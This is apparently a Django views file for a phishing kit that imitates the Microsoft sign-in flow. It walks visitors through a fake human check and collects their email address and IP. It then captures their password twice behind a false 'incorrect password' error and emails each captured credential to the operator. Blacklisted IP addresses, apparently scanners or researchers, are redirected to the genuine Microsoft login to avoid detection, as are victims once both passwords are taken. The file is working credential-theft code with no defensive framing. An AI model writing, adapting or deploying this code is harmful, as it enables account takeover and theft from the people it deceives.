from django.shortcuts import render,redirect
from .models import MsLogin,MsBlacklist
from django.core.mail import send_mail
from django.conf import  settings

import re


def Robotchecker(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    ip = None
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')

    blackListUsers = MsBlacklist.objects.all().values_list('email__ip_address', flat=True)

    if ip in blackListUsers:
        return redirect('https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638126793868136845.Y2ZiZGM2NTgtMzRjMC00ZGM0LWE0NzItOTcxYjM1MDFkMjQ3MjIwYTE1MTItMDY3YS00OTE2LWE2Y2ItMjA0NGYwZmIwOWRi&ui_locales=en-US&mkt=en-US&state=EgJM1fMUYX2n29ucOB5H_7wAlymjyYc5HUa43gg_FfWgJYrWUOzTFIZIr_wktwIJx7ObRay2DdY7v38nWpFJmBH77ewwJnDZm91xDWwPDwxT1D_kgR98M07wI6xfYkPtXfxTSXYF5Q1olYybMtRE17Kb4PAgsN2zZhG3mi8KnZX6hU5_BEA_rQidM_lUylziOAev3jVGZ8qSOO17TenXTmAErIHiYBNHokP5bx7VXzjysUJnnBzoBfhuWV98jNj9buD-J_IAbHjyPiRODyT1ow&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.16.0.0')


    if request.method == 'POST':
        try:
            if request.POST['humanbox']:
                return redirect('elogin')
        except:
            return render(request,'index.html', {'error_message':'Click the box to verify'})
    return render(request,'index.html' )


def EmailLogin(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    ip = None
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')

    blackListUsers = MsBlacklist.objects.all().values_list('email__ip_address', flat=True)

    if ip in blackListUsers:
        return redirect('https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638126793868136845.Y2ZiZGM2NTgtMzRjMC00ZGM0LWE0NzItOTcxYjM1MDFkMjQ3MjIwYTE1MTItMDY3YS00OTE2LWE2Y2ItMjA0NGYwZmIwOWRi&ui_locales=en-US&mkt=en-US&state=EgJM1fMUYX2n29ucOB5H_7wAlymjyYc5HUa43gg_FfWgJYrWUOzTFIZIr_wktwIJx7ObRay2DdY7v38nWpFJmBH77ewwJnDZm91xDWwPDwxT1D_kgR98M07wI6xfYkPtXfxTSXYF5Q1olYybMtRE17Kb4PAgsN2zZhG3mi8KnZX6hU5_BEA_rQidM_lUylziOAev3jVGZ8qSOO17TenXTmAErIHiYBNHokP5bx7VXzjysUJnnBzoBfhuWV98jNj9buD-J_IAbHjyPiRODyT1ow&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.16.0.0')

    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    ip = None
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')

    regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'

    if request.method == 'POST':
        if re.fullmatch(regex, str(request.POST['email-text'])) :
            msLogin = MsLogin.objects.create(email=request.POST['email-text'], ip_address=ip)
            msLogin.save()
            request.session['id'] = str(msLogin.id)
            return redirect('plogin')
        elif str(request.POST['email-text']).strip() == '':
            return render(request, 'oauth.html', {'msg':'Email cannot be empty'})
        else:
            return render(request, 'oauth.html', {'msg':'Incorrect Email'})
    return render(request, 'oauth.html')

def passwordlLogin(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    ip = None
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')

    blackListUsers = MsBlacklist.objects.all().values_list('email__ip_address', flat=True)

    if ip in blackListUsers:
        return redirect('https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638126793868136845.Y2ZiZGM2NTgtMzRjMC00ZGM0LWE0NzItOTcxYjM1MDFkMjQ3MjIwYTE1MTItMDY3YS00OTE2LWE2Y2ItMjA0NGYwZmIwOWRi&ui_locales=en-US&mkt=en-US&state=EgJM1fMUYX2n29ucOB5H_7wAlymjyYc5HUa43gg_FfWgJYrWUOzTFIZIr_wktwIJx7ObRay2DdY7v38nWpFJmBH77ewwJnDZm91xDWwPDwxT1D_kgR98M07wI6xfYkPtXfxTSXYF5Q1olYybMtRE17Kb4PAgsN2zZhG3mi8KnZX6hU5_BEA_rQidM_lUylziOAev3jVGZ8qSOO17TenXTmAErIHiYBNHokP5bx7VXzjysUJnnBzoBfhuWV98jNj9buD-J_IAbHjyPiRODyT1ow&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.16.0.0')

    error = ""
    user = MsLogin.objects.get(id=request.session['id'])

    if user.password1 != '':
        error = "Your account or password is incorrect. If you don\'t remember your password"


    if request.method == 'POST':
        if str(request.POST['passcode']).strip() == '':
            return render(request, 'oauth02_authorize.html',{'user':user,'error2':'Please enter the password for your Microsoft account.'})

        if user.password1 is not None:
            user.password2 = request.POST['passcode']
            user.save()

            subject = 'the login details'
            message = f'email: {user.email}\npassword2: {user.password2}\nip_address: {user.ip_address}'

            send_mail(
                subject,
                message,
                settings.EMAIL_HOST_USER,
                [settings.EMAIL_HOST_USER],
                fail_silently=False,
            )
            return redirect('https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638126793868136845.Y2ZiZGM2NTgtMzRjMC00ZGM0LWE0NzItOTcxYjM1MDFkMjQ3MjIwYTE1MTItMDY3YS00OTE2LWE2Y2ItMjA0NGYwZmIwOWRi&ui_locales=en-US&mkt=en-US&state=EgJM1fMUYX2n29ucOB5H_7wAlymjyYc5HUa43gg_FfWgJYrWUOzTFIZIr_wktwIJx7ObRay2DdY7v38nWpFJmBH77ewwJnDZm91xDWwPDwxT1D_kgR98M07wI6xfYkPtXfxTSXYF5Q1olYybMtRE17Kb4PAgsN2zZhG3mi8KnZX6hU5_BEA_rQidM_lUylziOAev3jVGZ8qSOO17TenXTmAErIHiYBNHokP5bx7VXzjysUJnnBzoBfhuWV98jNj9buD-J_IAbHjyPiRODyT1ow&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.16.0.0')
        user.password1 = request.POST['passcode']
        user.save()
        subject = 'the login details'
        message = f'email: {user.email}\npassword1: {user.password1}\nip_address: {user.ip_address}'

        send_mail(
            subject,
            message,
            settings.EMAIL_HOST_USER,
            [settings.EMAIL_HOST_USER],
            fail_silently=False,
        )

        return render(request, 'oauth02_authorize.html',{'user':user,'error':error})
    return render(request, 'oauth02_authorize.html',{'user':user})
